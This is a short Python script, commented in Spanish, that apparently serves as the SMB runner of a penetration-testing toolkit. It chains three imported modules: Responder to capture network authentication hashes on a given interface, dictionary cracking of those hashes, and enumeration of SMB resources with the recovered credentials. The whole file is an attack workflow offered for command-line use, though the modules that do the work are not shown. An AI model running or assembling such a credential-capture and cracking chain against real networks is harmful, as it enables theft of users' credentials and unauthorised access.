import sys
import os

# Asegurar que el path raíz esté en sys.path
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.abspath(os.path.join(CURRENT_DIR, ".."))
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

from modules.credential_capture import run_responder
from modules.hash_cracking import crack_hashes
from modules.advanced_enumeration import enumerate_with_credentials

def ejecutar_ataque_smb(interface, dictionary_path):
    print("[*] Lanzando ataque SMB: Responder + Crackeo + Enumeración avanzada")

    success = run_responder(interface)
    if not success:
        print("[-] No se capturaron hashes. Abortando módulo SMB.")
        return

    credenciales = crack_hashes("results/hashes.txt", dictionary_path)
    if not credenciales:
        print("[!] No se pudo crackear ningún hash.")
        return

    enumerate_with_credentials(credenciales)
    print("[+] Enumeración SMB completada.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python3 smb_runner.py <INTERFAZ> <DICCIONARIO>")
        sys.exit(1)

    interfaz = sys.argv[1]
    diccionario = sys.argv[2]
    ejecutar_ataque_smb(interfaz, diccionario)